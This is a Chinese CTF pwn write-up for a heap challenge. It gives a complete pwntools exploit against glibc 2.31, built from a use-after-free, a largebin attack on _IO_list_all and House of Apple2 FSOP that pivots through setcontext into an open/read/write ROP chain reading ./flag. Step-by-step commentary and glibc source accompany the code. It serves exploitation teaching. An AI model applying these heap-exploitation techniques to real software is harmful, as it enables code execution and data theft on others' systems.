1. 沙箱禁用execve，orw读flag
2. 添加chunk有10的数量限制，分配的chunk大小有限制，但还是可以分配tcache，初始化使用calloc，清空堆块内容
3. chunk_list，chunk_size两个全局数组
4. edit没有检查堆块是否释放，造成UAF
5. free也没有检查堆块是否释放，造成double free

```
from pwn import *

context(log_level='debug', arch='amd64', os='linux')


io = process('/home/kali/pwn/ISCC/ISCC_pwn_9/heapheap')
# io = gdb.debug('/home/kali/pwn/ISCC/ISCC_pwn_9/heapheap')
# io = remote('182.92.237.102',11000)

libc = ELF('/home/kali/pwn/ISCC/ISCC_pwn_9/libc-2.31.so')


def create(index, size):
    io.sendlineafter(b'choice',b'1')
    io.sendlineafter(b'index',str(index).encode(encoding='utf-8'))
    io.sendlineafter(b'Size',str(size).encode(encoding='utf-8'))


def free(index):
    io.sendlineafter(b'choice',b'4')
    io.sendlineafter(b'index',str(index).encode(encoding='utf-8'))


def edit(index, content):
    io.sendlineafter(b'choice', b'3')
    io.sendlineafter(b'index',str(index).encode(encoding='utf-8'))
    io.sendafter(b'context', content)


def show(index):
    io.sendlineafter(b'choice', b'2')
    io.sendlineafter(b'index', str(index).encode(encoding='utf-8'))


create(0, 0x420)
create(1, 0x410)
create(2, 0x410)
create(3, 0x410)
free(0)
show(0)

libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 96 - 0x10 - libc.symbols['__malloc_hook']
print(hex(libc_base))
io_list_all = libc_base + 0x1ed5a0

create(4, 0x430)
edit(0, b'a' * (0x10 - 1) + b'A')
show(0)
io.recvuntil(b'A')
heap_addr = u64(io.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
print(hex(heap_addr))


fd = libc_base + 0x1ecfd0
print(hex(fd))
payload = p64(fd) * 2 + p64(heap_addr) + p64(io_list_all - 0x20)
edit(0, payload)

free(2)
create(5, 0x470)
free(5)

open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
setcontext_addr = libc_base + libc.sym['setcontext']

pop_rdi_ret = libc_base + 0x0000000000023b6a
pop_rsi_ret = libc_base + 0x000000000002601f
pop_rdx_r12_ret = libc_base + 0x0000000000119431
ret_addr = libc_base + 0x0000000000022679

largebinchunk = heap_addr + 0x850     # chunk2
print(hex(largebinchunk))
IO_wfile_jumps = libc_base + 0x1e8f60

fake_IO_addr = largebinchunk
fake_IO_wide_addr = largebinchunk+0x100
fake_IO_vtable_addr = largebinchunk+0x200
orw_addr = largebinchunk+0x300
print_addr = heap_addr + 0x10
flag_addr = largebinchunk+0x400

fake_IO = b''
fake_IO = fake_IO.ljust(0x28-0x10,b'\x00')
fake_IO += p64(1)
fake_IO = fake_IO.ljust(0xa0-0x10,b'\x00')
fake_IO += p64(fake_IO_wide_addr)
fake_IO = fake_IO.ljust(0xd8-0x10,b'\x00')
fake_IO += p64(IO_wfile_jumps)
fake_IO = fake_IO.ljust(0x100-0x10)

fake_IO_wide = b''
fake_IO_wide = fake_IO_wide.ljust(0xa0,b'\x00')
fake_IO_wide += p64(orw_addr) + p64(ret_addr)
fake_IO_wide = fake_IO_wide.ljust(0xe0,b'\x00')
fake_IO_wide += p64(fake_IO_vtable_addr)
fake_IO_wide = fake_IO_wide.ljust(0x100,b'\x00')

fake_IO_vtable = b''
fake_IO_vtable = fake_IO_vtable.ljust(0x68,b'\x00')
fake_IO_vtable += p64(setcontext_addr+61)
fake_IO_vtable = fake_IO_vtable.ljust(0x100,b'\x00')

orw = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)
orw += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(print_addr) + p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) + p64(read_addr)
orw += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(print_addr) + p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) + p64(write_addr)
orw = orw.ljust(0x100,b'\x00')

flag = b'./flag'
payload = fake_IO + fake_IO_wide + fake_IO_vtable + orw + flag

edit(2, payload)

io.recvuntil(b'choice')
io.sendline(b'5')

# gdb.attach(io)
io.interactive()

```


前期的堆布局以及泄露基址的过程，此时堆上由一个0x420大小的largebin chunk

```
create(0, 0x420)
create(1, 0x410)
create(2, 0x410)
create(3, 0x410)
free(0)
show(0)

libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 96 - 0x10 - libc.symbols['__malloc_hook']
print(hex(libc_base))
io_list_all = libc_base + 0x1ed5a0

create(4, 0x430)
edit(0, b'a' * (0x10 - 1) + b'A')
show(0)
io.recvuntil(b'A')
heap_addr = u64(io.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
print(hex(heap_addr))
```

获取到该largebin-0x10来绕过fd和bk的检测，但其实将其改为IO_list_all-0x10也可以，因为这里没有检测，伪造bk字段

```
fd = libc_base + 0x1ecfd0
print(hex(fd))
payload = p64(fd) * 2 + p64(heap_addr) + p64(io_list_all - 0x20)
edit(0, payload)
```

触发unsortedbin堆块转移到largebin，大小为0x410进入了第一个分支

```
free(2)
create(5, 0x470)
```

p0为largebin中的chunk，0x420，p2为将插入的chunk，大小0x410

```c
else
{
	victim_index = largebin_index(size);
	bck = bin_at(av, victim_index);		// largebin地址
	fwd = bck->fd;				// fwd为第一个chunk

	if (fwd != bck)
	{
		size |= PREV_INUSE;
		if ((unsigned long)(size) < (unsigned long)chunksize_nomask(bck->bk))
		{
			fwd = bck;		// fwd为largebin地址
                        bck = bck->bk;		// bck为最后一个chunk

                        victim->fd_nextsize = fwd->fd;		// 
                        victim->bk_nextsize = fwd->fd->bk_nextsize;
			fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
		}
		else{}
	}
	else
		victim->fd_nextsize = victim->bk_nextsize = victim;
	}

	mark_bin(av, victim_index);
	victim->bk = bck;
	victim->fd = fwd;
	fwd->bk = victim;
	bck->fd = victim;
```

一系列指针操作

```
p2 -> fd_nextsize = fwd -> fd = p0		将插入chunk的fd_nextsize指向前一个chunk

p2 -> bk_nextsize = p0 -> bk_nextsize = io_list_all - 0x20		将插入chunk的bk_nextsize指向前一个fakechunk

p0 -> bk_nextsize = (io_list_all - 0x20) -> fd_nextsize = p0		fakechunk的fd_nextsize和前一个chunk的bk_nextsize指向p0
```

完成了 fakechunk->p2->p0，此时p2就为IO_list_all指向

接下来利用house of apple2，来实现fsop，orw读flag

```
fake_IO_addr = largebinchunk
fake_IO_wide_addr = largebinchunk+0x100
fake_IO_vtable_addr = largebinchunk+0x200
orw_addr = largebinchunk+0x300
print_addr = heap_addr + 0x10
flag_addr = largebinchunk+0x400

fake_IO = b''
fake_IO = fake_IO.ljust(0x28-0x10,b'\x00')
fake_IO += p64(1)
fake_IO = fake_IO.ljust(0xa0-0x10,b'\x00')
fake_IO += p64(fake_IO_wide_addr)
fake_IO = fake_IO.ljust(0xd8-0x10,b'\x00')
fake_IO += p64(IO_wfile_jumps)
fake_IO = fake_IO.ljust(0x100-0x10)

fake_IO_wide = b''
fake_IO_wide = fake_IO_wide.ljust(0xa0,b'\x00')
fake_IO_wide += p64(orw_addr) + p64(ret_addr)
fake_IO_wide = fake_IO_wide.ljust(0xe0,b'\x00')
fake_IO_wide += p64(fake_IO_vtable_addr)
fake_IO_wide = fake_IO_wide.ljust(0x100,b'\x00')

fake_IO_vtable = b''
fake_IO_vtable = fake_IO_vtable.ljust(0x68,b'\x00')
fake_IO_vtable += p64(setcontext_addr+61)
fake_IO_vtable = fake_IO_vtable.ljust(0x100,b'\x00')

orw = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)
orw += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(print_addr) + p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) + p64(read_addr)
orw += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(print_addr) + p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) + p64(write_addr)
orw = orw.ljust(0x100,b'\x00')

flag = b'./flag'
payload = fake_IO + fake_IO_wide + fake_IO_vtable + orw + flag

edit(2, payload)
```

主动触发exit，一系列调用exit->_IO_cleanup->_IO_flush_all_lockp->_IO_wfile_overflow->setcontext->orw_rop
